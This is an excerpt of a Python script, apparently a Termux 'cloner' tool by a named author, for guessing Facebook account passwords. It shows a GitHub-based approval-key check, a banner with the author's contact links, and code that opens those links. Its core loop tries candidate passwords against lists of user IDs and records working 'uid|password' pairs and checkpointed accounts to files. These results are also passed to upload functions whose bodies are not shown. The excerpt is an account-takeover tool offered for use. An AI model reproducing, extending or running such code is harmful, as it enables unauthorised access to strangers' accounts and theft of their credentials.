...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WATSAPPP🤲https:wa.me/±8801934031767")
	subprocess.check_output(["am", "start", "https://wa.me/±8801934031767"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Tremux-Suman/approval.txt/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR  
    Md Suman 707\033[1;32m[Hossain]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m |Tremux-Suman707\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  93779934541           │
\033[1;36m│ [✓] FACEBOOK : \x1b[1;32mSuman.love420\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [SUMAN] [pÏඋඋħÏ]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %sSUMAN❌ PROO CLONER❌"%(G,R,G,B,G))
		...
		print(GET)
		os.system('xdg-open https://www.facebook.com/profile.php?id=100038775840516')
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SUMAN] : %s/%s -> \033[0;92m [ SUMAN-OK:%s ]- \033[0;91m[SUMAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SUMAN-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SUMAN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SUMAN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SUMAN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
